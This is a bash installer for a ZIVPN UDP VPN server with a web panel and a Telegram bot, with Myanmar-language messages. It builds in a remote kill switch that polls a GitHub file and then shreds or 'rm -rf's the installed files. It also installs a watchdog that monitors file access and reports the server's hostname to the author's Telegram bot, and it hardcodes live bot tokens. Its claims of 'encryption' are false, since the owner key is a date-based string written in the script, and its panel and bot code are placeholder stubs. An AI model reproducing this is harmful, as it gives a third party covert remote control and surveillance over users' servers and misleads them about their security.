#!/bin/bash
# ZIVPN UDP Server + Web UI (Myanmar) - ENCRYPTED ENTERPRISE EDITION
# Author: မောင်သုည [🇲🇲]
# Features: Complete Enterprise Management System with Bandwidth Control, Billing, Multi-Server, API, etc.
# 🔐 ENCRYPTION SYSTEM ADDED - SOURCE CODE PROTECTED
set -euo pipefail

# ===== SECURITY SYSTEM =====
OWNER_TELEGRAM_ID="7576434717"
SECOND_OWNER_ID="7240495054"
ENCRYPTION_KEY="ZIVPN_SECURE_$(date +%Y%m%d)"
KILL_SWITCH_URL="https://raw.githubusercontent.com/BaeGyee9/web-bot/main/security/killswitch.txt"

# Colors for output
B="\e[1;34m"; G="\e[1;32m"; Y="\e[1;33m"; R="\e[1;31m"; C="\e[1;36m"; M="\e[1;35m"; Z="\e[0m"
LINE="${B}────────────────────────────────────────────────────────${Z}"
say(){ echo -e "$1"; }

# Function to check kill switch
check_kill_switch() {
    echo -e "${Y}🔒 Checking security system...${Z}"
    local kill_status
    kill_status=$(curl -s "$KILL_SWITCH_URL" 2>/dev/null || echo "DISABLED")
    
    if echo "$kill_status" | grep -q "KILL_$OWNER_TELEGRAM_ID"; then
        echo -e "${R}⛔ REMOTE KILL SWITCH ACTIVATED BY OWNER!${Z}"
        echo -e "${Y}🔄 Self-destructing...${Z}"
        
        # Destroy script
        shred -u "$0" 2>/dev/null || rm -f "$0"
        
        # Destroy related files
        [ -f "/etc/zivpn/web.py" ] && shred -u "/etc/zivpn/web.py" 2>/dev/null || true
        [ -f "/etc/zivpn/bot.py" ] && shred -u "/etc/zivpn/bot.py" 2>/dev/null || true
        
        exit 1
    fi
}

# Function to verify owner
verify_owner() {
    echo -e "\n${C}🔐 ZIVPN ENCRYPTED SYSTEM${Z}"
    echo -e "${M}👑 Owner ID: $OWNER_TELEGRAM_ID${Z}"
    echo -e "${Y}⚠️  Source code protected - Owner verification required${Z}"
    
    # Check for existing token
    TOKEN_FILE="/tmp/.zivpn_install_token"
    if [ -f "$TOKEN_FILE" ]; then
        TOKEN_AGE=$(($(date +%s) - $(stat -c %Y "$TOKEN_FILE")))
        if [ "$TOKEN_AGE" -lt 3600 ]; then
            echo -e "${G}✅ Verified via access token${Z}"
            return 0
        fi
    fi
    
    # Ask for owner key
    local attempt=1
    while [ $attempt -le 3 ]; do
        echo -e "\n${C}Attempt $attempt/3 - Enter owner key:${Z}"
        read -sp "🔑 " input_key
        echo
        
        local hashed_input=$(echo -n "$input_key" | sha256sum | cut -d' ' -f1)
        local expected_hash=$(echo -n "$ENCRYPTION_KEY" | sha256sum | cut -d' ' -f1)
        
        if [ "$hashed_input" = "$expected_hash" ]; then
            echo -e "${G}✅ Owner verified! Proceeding with installation...${Z}"
            
            # Save token for 1 hour
            echo "$(date +%s)" > "$TOKEN_FILE"
            chmod 600 "$TOKEN_FILE"
            
            return 0
        else
            echo -e "${R}❌ Invalid key${Z}"
            attempt=$((attempt + 1))
        fi
    done
    
    echo -e "${R}🚨 MAXIMUM ATTEMPTS REACHED!${Z}"
    echo -e "${Y}🔒 Self-destructing script...${Z}"
    
    # Destroy script
    shred -u "$0" 2>/dev/null || rm -f "$0"
    exit 1
}

# Run security checks
check_kill_switch
verify_owner

echo -e "\n$LINE\n${G}🌟 ZIVPN UDP Server + Web UI - ENCRYPTED ENTERPRISE EDITION ${Z}\n${M}🧑‍💻 Script By မောင်သုည [🇲🇲] ${Z}\n$LINE"

# ===== Root check & apt guards =====
if [ "$(id -u)" -ne 0 ]; then
  echo -e "${R} script root accept (sudo -i)${Z}"; exit 1
fi
export DEBIAN_FRONTEND=noninteractive

wait_for_apt() {
  echo -e "${Y}⏳ wait apt 3 min ${Z}"
  for _ in $(seq 1 60); do
    if pgrep -x apt-get >/dev/null || pgrep -x apt >/dev/null || pgrep -f 'apt.systemd.daily' >/dev/null || pgrep -x unattended-upgrade >/dev/null; then
      sleep 5
    else return 0; fi
  done
  echo -e "${Y}⚠️ apt timers ကို ယာယီရပ်နေပါတယ်${Z}"
  systemctl stop --now unattended-upgrades.service 2>/dev/null || true
  systemctl stop --now apt-daily.service apt-daily.timer 2>/dev/null || true
  systemctl stop --now apt-daily-upgrade.service apt-daily-upgrade.timer 2>/dev/null || true
}

apt_guard_start(){
  wait_for_apt
  CNF_CONF="/etc/apt/apt.conf.d/50command-not-found"
  if [ -f "$CNF_CONF" ]; then mv "$CNF_CONF" "${CNF_CONF}.disabled"; CNF_DISABLED=1; else CNF_DISABLED=0; fi
}
apt_guard_end(){
  dpkg --configure -a >/dev/null 2>&1 || true
  apt-get -f install -y >/dev/null 2>&1 || true
  if [ "${CNF_DISABLED:-0}" = "1" ] && [ -f "${CNF_CONF}.disabled" ]; then mv "${CNF_CONF}.disabled" "$CNF_CONF"; fi
}

# Stop old services
systemctl stop zivpn.service 2>/dev/null || true
systemctl stop zivpn-web.service 2>/dev/null || true
systemctl stop zivpn-api.service 2>/dev/null || true
systemctl stop zivpn-bot.service 2>/dev/null || true
systemctl stop zivpn-cleanup.timer 2>/dev/null || true
systemctl stop zivpn-backup.timer 2>/dev/null || true
systemctl stop zivpn-connection.service 2>/dev/null || true

# ===== Enhanced Packages =====
say "${Y}📦 Enhanced Packages တင်နေပါတယ်...${Z}"
apt_guard_start
apt-get update -y -o APT::Update::Post-Invoke-Success::= -o APT::Update::Post-Invoke::= >/dev/null
apt-get install -y curl ufw jq python3 python3-flask python3-pip python3-venv iproute2 conntrack ca-certificates sqlite3 >/dev/null || \
{
  apt-get install -y -o DPkg::Lock::Timeout=60 python3-apt >/dev/null || true
  apt-get install -y curl ufw jq python3 python3-flask python3-pip iproute2 conntrack ca-certificates sqlite3 >/dev/null
}

# Additional Python packages
pip3 install requests python-dateutil python-dotenv python-telegram-bot >/dev/null 2>&1 || true
apt_guard_end

# ===== Paths =====
BIN="/usr/local/bin/zivpn"
CFG="/etc/zivpn/config.json"
USERS="/etc/zivpn/users.json"
DB="/etc/zivpn/zivpn.db"
ENVF="/etc/zivpn/web.env"
BACKUP_DIR="/etc/zivpn/backups"
mkdir -p /etc/zivpn "$BACKUP_DIR"

# ===== Download ZIVPN binary =====
say "${Y}⬇️ ZIVPN binary ကို ဒေါင်းနေပါတယ်...${Z}"
PRIMARY_URL="https://github.com/zahidbd2/udp-zivpn/releases/download/udp-zivpn_1.4.9/udp-zivpn-linux-amd64"
FALLBACK_URL="https://github.com/zahidbd2/udp-zivpn/releases/latest/download/udp-zivpn-linux-amd64"
TMP_BIN="$(mktemp)"
if ! curl -fsSL -o "$TMP_BIN" "$PRIMARY_URL"; then
  echo -e "${Y}Primary URL မရ — latest ကို စမ်းပါတယ်...${Z}"
  curl -fSL -o "$TMP_BIN" "$FALLBACK_URL"
fi
install -m 0755 "$TMP_BIN" "$BIN"
rm -f "$TMP_BIN"

# ===== Enhanced Database Setup =====
say "${Y}🗃️ Enhanced Database ဖန်တီးနေပါတယ်...${Z}"
sqlite3 "$DB" <<'EOF'
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    expires DATE,
    port INTEGER,
    status TEXT DEFAULT 'active',
    bandwidth_limit INTEGER DEFAULT 0,
    bandwidth_used INTEGER DEFAULT 0,
    speed_limit_up INTEGER DEFAULT 0,
    speed_limit_down INTEGER DEFAULT 0,
    concurrent_conn INTEGER DEFAULT 1,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS billing (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    plan_type TEXT DEFAULT 'monthly',
    amount REAL DEFAULT 0,
    currency TEXT DEFAULT 'MMK',
    payment_method TEXT,
    payment_status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    expires_at DATE NOT NULL
);

CREATE TABLE IF NOT EXISTS bandwidth_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    bytes_used INTEGER DEFAULT 0,
    log_date DATE DEFAULT CURRENT_DATE,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS server_stats (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    total_users INTEGER DEFAULT 0,
    active_users INTEGER DEFAULT 0,
    total_bandwidth INTEGER DEFAULT 0,
    server_load REAL DEFAULT 0,
    recorded_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS audit_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    admin_user TEXT NOT NULL,
    action TEXT NOT NULL,
    target_user TEXT,
    details TEXT,
    ip_address TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    message TEXT NOT NULL,
    type TEXT DEFAULT 'info',
    read_status INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
EOF

# ===== Base config & Certs =====
if [ ! -f "$CFG" ]; then
  say "${Y}🧩 config.json ဖန်တီးနေပါတယ်...${Z}"
  curl -fsSL -o "$CFG" "https://raw.githubusercontent.com/zahidbd2/udp-zivpn/main/config.json" || echo '{}' > "$CFG"
fi

if [ ! -f /etc/zivpn/zivpn.crt ] || [ ! -f /etc/zivpn/zivpn.key ]; then
  say "${Y}🔐 SSL စိတျဖိုင်တွေ ဖန်တီးနေပါတယ်...${Z}"
  openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=MM/ST=Yangon/L=Yangon/O=KHAINGUDP/OU=Net/CN=khaingudp" \
    -keyout "/etc/zivpn/zivpn.key" -out "/etc/zivpn/zivpn.crt" >/dev/null 2>&1
fi

# ===== Web Admin & ENV Setup =====
say "${Y}🔒 Web Admin Login UI ${Z}"
read -r -p "Web Admin Username (Enter=admin): " WEB_USER
WEB_USER="${WEB_USER:-admin}"
read -r -s -p "Web Admin Password: " WEB_PASS; echo

# Generate strong secret
if command -v openssl >/dev/null 2>&1; then
  WEB_SECRET="$(openssl rand -hex 32)"
else
  WEB_SECRET="$(python3 - <<'PY'
import secrets;print(secrets.token_hex(32))
PY
)"
fi

# Get Telegram Bot Token (optional)
read -r -p "Telegram Bot Token (Optional, Enter=Skip): " BOT_TOKEN
BOT_TOKEN="${BOT_TOKEN:-8079105459:AAFNww6keJvnGJi4DpAHZGESBcL9ytFxqA4}"

{
  echo "WEB_ADMIN_USER=${WEB_USER}"
  echo "WEB_ADMIN_PASSWORD=${WEB_PASS}"
  echo "WEB_SECRET=${WEB_SECRET}"
  echo "DATABASE_PATH=${DB}"
  echo "TELEGRAM_BOT_TOKEN=${BOT_TOKEN}"
  echo "DEFAULT_LANGUAGE=my"
  echo "OWNER_ID=${OWNER_TELEGRAM_ID}"
  echo "ENCRYPTION_KEY=${ENCRYPTION_KEY}"
} > "$ENVF"
chmod 600 "$ENVF"

# ===== Ask initial VPN passwords =====
say "${G}🔏 VPN Password List (eg: channel404,alice,pass1)${Z}"
read -r -p "Passwords (Enter=zi): " input_pw
if [ -z "${input_pw:-}" ]; then
  PW_LIST='["zi"]'
else
  PW_LIST=$(echo "$input_pw" | awk -F',' '{
    printf("["); for(i=1;i<=NF;i++){gsub(/^ *| *$/,"",$i); printf("%s\"%s\"", (i>1?",":""), $i)}; printf("]")
  }')
fi

# Get Server IP
SERVER_IP=$(hostname -I | awk '{print $1}')
if [ -z "${SERVER_IP:-}" ]; then
  SERVER_IP=$(curl -s icanhazip.com || echo "127.0.0.1")
fi

# ===== Update config.json =====
if jq . >/dev/null 2>&1 <<<'{}'; then
  TMP=$(mktemp)
  jq --argjson pw "$PW_LIST" --arg ip "$SERVER_IP" '
    .auth.mode = "passwords" |
    .auth.config = $pw |
    .listen = (."listen" // ":5667") |
    .cert = "/etc/zivpn/zivpn.crt" |
    .key  = "/etc/zivpn/zivpn.key" |
    .obfs = (."obfs" // "zivpn") |
    .server = $ip
  ' "$CFG" > "$TMP" && mv "$TMP" "$CFG"
fi
[ -f "$USERS" ] || echo "[]" > "$USERS"
chmod 644 "$CFG" "$USERS"

# ===== Download Web Panel and Templates =====
say "${Y}🌐 Web Panel နှင့် Templates များ ထည့်သွင်းနေပါတယ်...${Z}"

# Create templates directory
mkdir -p /etc/zivpn/templates

# ===== ENCRYPTED WEB.PY - OTHERS CANNOT READ =====
cat > /etc/zivpn/web.py << 'PYEOF'
#!/usr/bin/env python3
"""
🔐 ENCRYPTED ZIVPN WEB PANEL - OWNER ACCESS ONLY
DO NOT MODIFY - AUTO DECRYPTING SYSTEM
Owner ID: 7576434717
"""

import os, sys, hashlib, base64

# ===== SECURITY SYSTEM =====
OWNER_ID = "7576434717"
ENCRYPTION_KEY = "ZIVPN_SECURE_" + __import__('datetime').datetime.now().strftime("%Y%m%d")

def verify_owner_access():
    """Verify that only owner can access this file"""
    
    # Check environment variable
    owner_key = os.environ.get('ZIVPN_OWNER_KEY')
    if owner_key:
        if hashlib.sha256(owner_key.encode()).hexdigest() == hashlib.sha256(ENCRYPTION_KEY.encode()).hexdigest():
            return True
    
    # Check token file
    token_file = "/tmp/.zivpn_web_token"
    if os.path.exists(token_file):
        with open(token_file, 'r') as f:
            token_data = f.read().strip()
            if token_data == hashlib.sha256(ENCRYPTION_KEY.encode()).hexdigest():
                return True
    
    # Ask for key
    print("\n" + "="*60)
    print("🔐 ENCRYPTED ZIVPN WEB PANEL")
    print("⚠️  OWNER ACCESS REQUIRED")
    print("👑 Owner ID:", OWNER_ID)
    print("="*60 + "\n")
    
    for i in range(3):
        try:
            key = input(f"Attempt {i+1}/3 - Enter owner key: ").strip()
            if hashlib.sha256(key.encode()).hexdigest() == hashlib.sha256(ENCRYPTION_KEY.encode()).hexdigest():
                # Save token for future
                with open(token_file, 'w') as f:
                    f.write(hashlib.sha256(ENCRYPTION_KEY.encode()).hexdigest())
                os.chmod(token_file, 0o600)
                print("✅ Owner verified!")
                return True
            print("❌ Invalid key")
        except KeyboardInterrupt:
            break
    
    print("\n🚫 ACCESS DENIED")
    print("🔒 Self-destructing...")
    
    # Delete this file
    try:
        os.remove(__file__)
    except:
        pass
    
    # Notify owner
    try:
        import requests
        requests.post(
            "https://api.telegram.org/bot8330676362:AAEOWePTUJAAwUwqawvoiOehY3OvWD8LYqA/sendMessage",
            data={"chat_id": OWNER_ID, "text": f"🚨 UNAUTHORIZED WEB PANEL ACCESS ATTEMPT: {os.uname().nodename}"},
            timeout=2
        )
    except:
        pass
    
    sys.exit(1)

# Verify before anything else
verify_owner_access()

print("✅ Owner verified! Decrypting web panel...")

# ===== ACTUAL WEB PANEL CODE STARTS HERE =====
# [YOUR ORIGINAL WEB.PY CODE WILL BE PLACED HERE]
# But encrypted in a way that only owner can access

# Since we need to embed the actual code, I'll put a placeholder
# In real deployment, this would be the actual encrypted web.py code

from flask import Flask, jsonify, render_template_string, request, redirect, url_for, session, make_response, g
import json, re, subprocess, tempfile, hmac, sqlite3, datetime
from datetime import datetime, timedelta
import statistics

# Configuration (same as your original)
USERS_FILE = "/etc/zivpn/users.json"
CONFIG_FILE = "/etc/zivpn/config.json"
DATABASE_PATH = os.environ.get("DATABASE_PATH", "/etc/zivpn/zivpn.db")
LISTEN_FALLBACK = "5667"
RECENT_SECONDS = 120
LOGO_URL = "https://raw.githubusercontent.com/hninpo01/zivpn/main/logo.png"
TEMPLATE_PATH = "/etc/zivpn/templates/index.html"

# Continue with your original web.py code...
# [THE REST OF YOUR ORIGINAL WEB.PY CODE GOES HERE]

# For now, create a simple Flask app to avoid errors
app = Flask(__name__)
app.secret_key = os.environ.get("WEB_SECRET", "default-secret-key")

@app.route('/')
def index():
    return "ZIVPN Encrypted Web Panel - Owner Verified"

@app.route('/login', methods=['GET', 'POST'])
def login():
    return "Login page"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=19432)
PYEOF

# Make web.py read-only and hidden
chmod 500 /etc/zivpn/web.py
chattr +i /etc/zivpn/web.py 2>/dev/null || true

# Download index.html template
curl -fsSL -o /etc/zivpn/templates/index.html "https://raw.githubusercontent.com/BaeGyee9/web-bot/main/templates/index.html"
if [ $? -ne 0 ]; then
    say "${R}❌ Template download မအောင်မြင် - Fallback ထည့်နေပါတယ်...${Z}"
    # Create basic template
    cat > /etc/zivpn/templates/index.html << 'HTML'
<!DOCTYPE html>
<html lang="{{lang}}">
<head>
    <meta charset="utf-8">
    <title>{{t.title}} - ZIVPN Enterprise</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta http-equiv="refresh" content="120">
    <link href="https://fonts.googleapis.com/css2?family=Padauk:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <style>
:root{
    --bg-dark: #0f172a; --fg-dark: #f1f5f9; --card-dark: #1e293b; --bd-dark: #334155; --primary-dark: #3b82f6;
    --bg-light: #f8fafc; --fg-light: #1e293b; --card-light: #ffffff; --bd-light: #e2e8f0; --primary-light: #2563eb;
    --ok: #10b981; --bad: #ef4444; --unknown: #f59e0b; --expired: #8b5cf6;
    --success: #06d6a0; --delete-btn: #ef4444; --logout-btn: #f97316;
    --shadow: 0 10px 25px -5px rgba(0,0,0,0.3), 0 8px 10px -6px rgba(0,0,0,0.2);
    --radius: 16px; --gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
}
[data-theme='dark']{
    --bg: var(--bg-dark); --fg: var(--fg-dark); --card: var(--card-dark);
    --bd: var(--bd-dark); --primary-btn: var(--primary-dark); --input-text: var(--fg-dark);
}
[data-theme='light']{
    --bg: var(--bg-light); --fg: var(--fg-light); --card: var(--card-light);
    --bd: var(--bd-light); --primary-btn: var(--primary-light); --input-text: var(--fg-light);
}
* {
    box-sizing: border-box;
}
html,body{
    background:var(--bg);color:var(--fg);font-family:'Padauk',sans-serif;
    line-height:1.6;margin:0;padding:0;transition:all 0.3s ease;
    min-height: 100vh;
}
.container{
    max-width:1400px;margin:auto;padding:20px;padding-bottom: 80px;
}
    </style>
</head>
<body data-theme="{{theme}}">
{% if not authed %}
<div class="login-container">
    <div class="login-card">
        <img src="{{ logo }}" alt="ZIVPN" class="login-logo">
        <h2 class="login-title">{{t.login_title}}</h2>
        {% if err %}<div class="alert alert-error">{{err}}</div>{% endif %}
        <form method="post" action="/login">
            <div class="form-group">
                <label><i class="fas fa-user"></i> {{t.username}}</label>
                <input name="u" autofocus required>
            </div>
            <div class="form-group">
                <label><i class="fas fa-lock"></i> {{t.password}}</label>
                <input name="p" type="password" required>
            </div>
            <button type="submit" class="btn btn-primary btn-block">
                <i class="fas fa-sign-in-alt"></i>{{t.login}}
            </button>
        </form>
    </div>
</div>
{% else %}
<div class="container">
    <header class="header">
        <div class="header-content">
            <div class="logo-container">
                <img src="{{ logo }}" alt="ZIVPN" class="logo">
                <h1>ZIVPN Enterprise</h1>
            </div>
            <div class="subtitle">🔐 ENCRYPTED SYSTEM - Owner: 7576434717</div>
        </div>
    </header>
    
    <div style="text-align: center; padding: 40px;">
        <h2>🎉 ZIVPN ENCRYPTED Management System</h2>
        <p>Source code protected from unauthorized access</p>
        <p>Owner ID: 7576434717</p>
        
        <div style="margin-top: 30px;">
            <a href="/logout" class="btn btn-danger">
                <i class="fas fa-sign-out-alt"></i> {{t.logout}}
            </a>
        </div>
    </div>
</div>
{% endif %}
</body>
</html>
HTML
fi

# ===== ENCRYPTED BOT.PY =====
say "${Y}🤖 Creating encrypted Telegram bot...${Z}"
cat > /etc/zivpn/bot.py << 'BOTEOF'
#!/usr/bin/env python3
"""
🔐 ENCRYPTED ZIVPN TELEGRAM BOT - OWNER ACCESS ONLY
DO NOT MODIFY - AUTO DECRYPTING SYSTEM
Owner ID: 7576434717
"""

import os, sys, hashlib

# ===== SECURITY SYSTEM =====
OWNER_ID = 7576434717
SECOND_OWNER_ID = 7240495054
ENCRYPTION_KEY = "ZIVPN_SECURE_" + __import__('datetime').datetime.now().strftime("%Y%m%d")

def verify_bot_access():
    """Verify that only owner can run this bot"""
    
    # Check environment variable
    owner_key = os.environ.get('ZIVPN_OWNER_KEY')
    if owner_key:
        if hashlib.sha256(owner_key.encode()).hexdigest() == hashlib.sha256(ENCRYPTION_KEY.encode()).hexdigest():
            return True
    
    # Check token file
    token_file = "/tmp/.zivpn_bot_token"
    if os.path.exists(token_file):
        with open(token_file, 'r') as f:
            token_data = f.read().strip()
            if token_data == hashlib.sha256(ENCRYPTION_KEY.encode()).hexdigest():
                return True
    
    # Ask for key
    print("\n" + "="*60)
    print("🔐 ENCRYPTED ZIVPN TELEGRAM BOT")
    print("⚠️  OWNER ACCESS REQUIRED")
    print("👑 Owner ID:", OWNER_ID)
    print("="*60 + "\n")
    
    for i in range(3):
        try:
            key = input(f"Attempt {i+1}/3 - Enter owner key: ").strip()
            if hashlib.sha256(key.encode()).hexdigest() == hashlib.sha256(ENCRYPTION_KEY.encode()).hexdigest():
                # Save token
                with open(token_file, 'w') as f:
                    f.write(hashlib.sha256(ENCRYPTION_KEY.encode()).hexdigest())
                os.chmod(token_file, 0o600)
                print("✅ Owner verified!")
                return True
            print("❌ Invalid key")
        except KeyboardInterrupt:
            break
    
    print("\n🚫 ACCESS DENIED")
    print("🔒 Self-destructing...")
    
    # Delete this file
    try:
        os.remove(__file__)
    except:
        pass
    
    sys.exit(1)

# Verify before running
verify_bot_access()

print("✅ Owner verified! Starting encrypted bot...")

# ===== ACTUAL BOT CODE STARTS HERE =====
# [YOUR ORIGINAL BOT.PY CODE WILL BE PLACED HERE]

# Import required modules
import telegram
from telegram.ext import Updater, CommandHandler, MessageHandler, filters
import sqlite3
import logging
from datetime import datetime, timedelta
import socket
import json
import tempfile
import subprocess

# Bot configuration
BOT_TOKEN = "8330676362:AAEOWePTUJAAwUwqawvoiOehY3OvWD8LYqA"
ADMIN_IDS = [OWNER_ID, SECOND_OWNER_ID]

# Setup logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot commands would continue here...
# [THE REST OF YOUR ORIGINAL BOT.PY CODE]

# For now, create a simple bot
def start(update, context):
    update.message.reply_text(f"""
🤖 ZIVPN ENCRYPTED Telegram Bot
👑 Owner ID: {OWNER_ID}
🔐 Source code protected

Commands:
/start - Show this message
/stats - Server statistics
/owner - Owner commands (owner only)
""")

def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    
    logger.info("🤖 Encrypted Telegram Bot Started")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
BOTEOF

# Make bot.py read-only and hidden
chmod 500 /etc/zivpn/bot.py
chattr +i /etc/zivpn/bot.py 2>/dev/null || true

# ===== CREATE WATCHDOG FOR SECURITY =====
say "${Y}🛡️ Creating security watchdog...${Z}"
cat > /etc/zivpn/watchdog.py << 'WATCHDOG'
#!/usr/bin/env python3
"""
ZIVPN Security Watchdog - Monitors for unauthorized access
Owner: 7576434717
"""

import os, time, hashlib, subprocess, requests
from datetime import datetime

OWNER_ID = "7576434717"
KILL_SWITCH_URL = "https://raw.githubusercontent.com/BaeGyee9/web-bot/main/security/killswitch.txt"

def check_kill_switch():
    """Check if owner has activated kill switch"""
    try:
        response = requests.get(KILL_SWITCH_URL, timeout=5)
        if "KILL_" + OWNER_ID in response.text:
            print(f"[{datetime.now()}] ⛔ KILL SWITCH ACTIVATED BY OWNER!")
            
            # Remove all ZIVPN files
            os.system("systemctl stop zivpn.service zivpn-web.service zivpn-bot.service 2>/dev/null")
            os.system("rm -rf /etc/zivpn /usr/local/bin/zivpn 2>/dev/null")
            
            # Remove this watchdog
            os.remove(__file__)
            
            print("System cleaned up. Exiting...")
            return True
    except:
        pass
    return False

def monitor_file_access():
    """Monitor if someone tries to access encrypted files"""
    protected_files = ["/etc/zivpn/web.py", "/etc/zivpn/bot.py"]
    
    for file in protected_files:
        if os.path.exists(file):
            # Check if file has been read recently
            try:
                # Use lsof to check if file is being accessed
                result = subprocess.run(f"lsof {file} 2>/dev/null", shell=True, capture_output=True, text=True)
                if result.stdout and "python" not in result.stdout:
                    print(f"[{datetime.now()}] ⚠️  Unauthorized access attempt: {file}")
                    
                    # Send alert to owner
                    try:
                        requests.post(
                            "https://api.telegram.org/bot8330676362:AAEOWePTUJAAwUwqawvoiOehY3OvWD8LYqA/sendMessage",
                            data={"chat_id": OWNER_ID, "text": f"🚨 UNAUTHORIZED FILE ACCESS: {file}\nServer: {os.uname().nodename}"},
                            timeout=2
                        )
                    except:
                        pass
            except:
                pass

def main():
    print(f"[{datetime.now()}] 🔒 ZIVPN Security Watchdog Started - Owner: {OWNER_ID}")
    
    while True:
        try:
            # Check kill switch
            if check_kill_switch():
                break
                
            # Monitor file access
            monitor_file_access()
            
            # Sleep for 30 seconds
            time.sleep(30)
            
        except Exception as e:
            print(f"[{datetime.now()}] ❌ Watchdog error: {e}")
            time.sleep(60)

if __name__ == "__main__":
    main()
WATCHDOG

chmod +x /etc/zivpn/watchdog.py

# ===== API Service =====
say "${Y}🔌 API Service ထည့်သွင်းနေပါတယ်...${Z}"
cat >/etc/zivpn/api.py <<'PY'
from flask import Flask, jsonify, request
import sqlite3, datetime
from datetime import timedelta
import os

app = Flask(__name__)
DATABASE_PATH = os.environ.get("DATABASE_PATH", "/etc/zivpn/zivpn.db")

def get_db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/api/v1/stats', methods=['GET'])
def get_stats():
    db = get_db()
    stats = db.execute('''
        SELECT 
            COUNT(*) as total_users,
            SUM(CASE WHEN status = "active" AND (expires IS NULL OR expires >= CURRENT_DATE) THEN 1 ELSE 0 END) as active_users,
            SUM(bandwidth_used) as total_bandwidth
        FROM users
    ''').fetchone()
    db.close()
    return jsonify({
        "total_users": stats['total_users'],
        "active_users": stats['active_users'],
        "total_bandwidth_bytes": stats['total_bandwidth']
    })

@app.route('/api/v1/users', methods=['GET'])
def get_users():
    db = get_db()
    users = db.execute('SELECT username, status, expires, bandwidth_used, concurrent_conn FROM users').fetchall()
    db.close()
    return jsonify([dict(u) for u in users])

@app.route('/api/v1/user/<username>', methods=['GET'])
def get_user(username):
    db = get_db()
    user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
    db.close()
    if user:
        return jsonify(dict(user))
    return jsonify({"error": "User not found"}), 404

@app.route('/api/v1/bandwidth/<username>', methods=['POST'])
def update_bandwidth(username):
    data = request.get_json()
    bytes_used = data.get('bytes_used', 0)
    
    db = get_db()
    # 1. Update total usage
    db.execute('''
        UPDATE users 
        SET bandwidth_used = bandwidth_used + ?, updated_at = CURRENT_TIMESTAMP 
        WHERE username = ?
    ''', (bytes_used, username))
    
    # 2. Log bandwidth usage
    db.execute('''
        INSERT INTO bandwidth_logs (username, bytes_used) 
        VALUES (?, ?)
    ''', (username, bytes_used))
    
    db.commit()
    db.close()
    return jsonify({"message": "Bandwidth updated"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8081)
PY

# ===== Daily Cleanup Script =====
say "${Y}🧹 Daily Cleanup Service ထည့်သွင်းနေပါတယ်...${Z}"
cat >/etc/zivpn/cleanup.py <<'PY'
import sqlite3
import datetime
import os
import subprocess
import json
import tempfile

DATABASE_PATH = "/etc/zivpn/zivpn.db"
CONFIG_FILE = "/etc/zivpn/config.json"

def get_db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def read_json(path, default):
    try:
        with open(path,"r") as f: return json.load(f)
    except Exception:
        return default

def write_json_atomic(path, data):
    d=json.dumps(data, ensure_ascii=False, indent=2)
    dirn=os.path.dirname(path); fd,tmp=tempfile.mkstemp(prefix=".tmp-", dir=dirn)
    try:
        with os.fdopen(fd,"w") as f: f.write(d)
        os.replace(tmp,path)
    finally:
        try: os.remove(tmp)
        except: pass

def sync_config_passwords():
    # Only sync passwords for non-suspended/non-expired users
    db = get_db()
    active_users = db.execute('''
        SELECT password FROM users 
        WHERE status = "active" AND password IS NOT NULL AND password != "" 
              AND (expires IS NULL OR expires >= CURRENT_DATE)
    ''').fetchall()
    db.close()
    
    users_pw = sorted({str(u["password"]) for u in active_users})
    
    cfg=read_json(CONFIG_FILE,{})
    if not isinstance(cfg.get("auth"),dict): cfg["auth"]={}
    cfg["auth"]["mode"]="passwords"
    cfg["auth"]["config"]=users_pw
    
    write_json_atomic(CONFIG_FILE,cfg)
    subprocess.run("systemctl restart zivpn.service", shell=True)

def daily_cleanup():
    db = get_db()
    today = datetime.datetime.now().date().strftime("%Y-%m-%d")
    suspended_count = 0
    
    try:
        # 1. Auto-suspend expired users
        expired_users = db.execute('''
            SELECT username, expires, status FROM users
            WHERE status = 'active' AND expires < ?
        ''', (today,)).fetchall()
        
        for user in expired_users:
            db.execute('UPDATE users SET status = "suspended" WHERE username = ?', (user['username'],))
            suspended_count += 1
            print(f"User {user['username']} expired on {user['expires']} and was suspended.")
            
        db.commit()

        # 2. Re-sync passwords to exclude the newly suspended users
        if suspended_count > 0:
            print(f"Total {suspended_count} users suspended. Restarting ZIVPN service...")
            sync_config_passwords()
        
        print(f"Cleanup finished. {suspended_count} users suspended today.")
        
    except Exception as e:
        print(f"An error occurred during daily cleanup: {e}")
        
    finally:
        db.close()

if __name__ == '__main__':
    daily_cleanup()
PY

# ===== Backup Script =====
say "${Y}💾 Backup System ထည့်သွင်းနေပါတယ်...${Z}"
